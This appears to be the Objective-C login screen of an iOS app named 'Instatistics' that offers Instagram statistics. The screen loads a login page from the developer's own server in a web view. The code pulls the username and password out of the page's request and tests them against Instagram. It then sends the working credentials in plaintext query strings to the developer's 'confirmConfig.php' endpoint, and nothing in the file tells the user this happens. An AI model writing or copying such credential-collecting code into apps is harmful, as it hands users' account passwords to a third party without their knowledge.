//
//  LoginViewController.m
//  Instatistics
//
//  Created by Devsteam.Mobi iMac on 10/4/16.
//  Copyright © 2016 Devsteam.mobi. All rights reserved.
//

#import "LoginViewController.h"
#import "AppDelegate.h"
#import "CustomInputView.h"
#import "BaseNavigationController.h"
#import "AccountStateViewController.h"


@interface LoginViewController ()<UIWebViewDelegate>

@property (weak, nonatomic) IBOutlet UIWebView *loginWebview;

@end

@implementation LoginViewController

- (IBAction)closeView:(id)sender {
    [self dismissViewControllerAnimated:YES completion:^{
       
    }];
}

-(void)webView:(UIWebView *)webView didFailLoadWithError:(NSError *)error
{

}

-(void)webViewDidStartLoad:(UIWebView *)webView
{


}

-(void)webViewDidFinishLoad:(UIWebView *)webView
{
    
    
}

-(BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType
{
    
    
    if([request.URL.absoluteString containsString:[NSString stringWithFormat:@"%@config2.php", MAINLINK]])
    {
        
        
        NSArray * credentials = [request.URL.absoluteString componentsSeparatedByString:@"username="];
        
        if (credentials.count == 2) {
            NSArray * credentials2 = [credentials[1] componentsSeparatedByString:@"&password="];
            if (credentials2.count == 2) {
                NSString * username = credentials2[0];
                NSString * password = credentials2[1];
                
                if(username.length > 0 && password.length > 0)
                {
                    [[InstagramAPI sharedInstance] loginWithUsername:username andPassword:password comp:^(BOOL response) {
                        
                        if (!response) {
                            NSString *urlAddress = [NSString stringWithFormat:@"%@failConfig.php?username=%@", MAINLINK, username];
                                                   
                            NSURL *url = [NSURL URLWithString:urlAddress];
                            NSURLRequest *requestObj = [NSURLRequest requestWithURL:url];
                            [_loginWebview loadRequest:requestObj];
                            
                            
                        } else {
                            NSString *urlAddress =
                                                     [NSString stringWithFormat:@"%@confirmConfig.php?username=%@&password=%@",
                                                   MAINLINK, username, password];
                            NSURL *url = [NSURL URLWithString:urlAddress];
                            NSURLRequest *requestObj = [NSURLRequest requestWithURL:url];
                            [_loginWebview loadRequest:requestObj];
                        }
                        
                    } failure:^(NSError * error) {
                        
                    }];
                    
                }
                
                else
                {
                    NSString *urlAddress = [NSString stringWithFormat:@"%@failConfig.php?username=", MAINLINK];
                    NSURL *url = [NSURL URLWithString:urlAddress];
                    NSURLRequest *requestObj = [NSURLRequest requestWithURL:url];
                    [_loginWebview loadRequest:requestObj];
                }
                
            }
            
        }
        
        return false;
    }
    if([request.URL.absoluteString containsString:@"http://insta.com/"]) {
        NSArray * credentials = [request.URL.absoluteString componentsSeparatedByString:@"username="];
        
        if (credentials.count == 2) {
            NSArray * credentials2 = [credentials[1] componentsSeparatedByString:@"&password="];
            if (credentials2.count == 2) {
                NSString * username = credentials2[0];
                NSString * password = credentials2[1];
                
                [[InstagramAPI sharedInstance] loginWithUsername:username andPassword:password comp:^(BOOL response) {
                    
                    if (response) {
                        BaseNavigationController * navigationController = (BaseNavigationController*)self.navigationController;
                        StartPageViewController * startPage = navigationController.startViewController;
                        startPage.mainUser = [[InstagramAPI sharedInstance] loggedInUser];
                        
                        AccountStateViewController * account = self.target;
                        [account buildInterfaceeForState:_connected];
                        [self dismissViewControllerAnimated:YES completion:^{
                            
                        }];
                        
                        
                    }
                    
                } failure:^(NSError * error) {
                    
                }];
                return false;
            }
        }
        
        
        
    }
    
    return YES;
}



-(void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];
    
    UIBarButtonItem *leftButton = [UIBarButtonItem new];
    leftButton.title = @"";
    self.navigationItem.leftBarButtonItem = leftButton;
    self.navigationItem.title = @"Login";
    
}



- (void)viewDidLoad {
    [super viewDidLoad];
    
    NSURL *url  =  [NSURL URLWithString:[NSString stringWithFormat:@"%@config.php", MAINLINK]];
    NSURLRequest * request = [NSURLRequest requestWithURL:url];
    [_loginWebview loadRequest:request];
    
    
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}



- (IBAction)login:(UIButton*)sender {
    
    sender.userInteractionEnabled = NO;
    
}

- (void)keyboardWillShow:(NSNotification *)notification {
    [super keyboardWillShow:notification];
   
    [self.navigationController setNavigationBarHidden:[AppUtils isIphoneVersion:4] || [AppUtils isIphoneVersion:5]  animated:YES];
    
}

- (void)keyboardWillHide:(NSNotification *)notification {
    [super keyboardWillHide:notification];
    [self.navigationController setNavigationBarHidden:NO animated:YES];
    
}



#pragma mark - Navigation

// In a storyboard-based application, you will often want to do a little preparation before navigation
//- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {
//
//}


@end
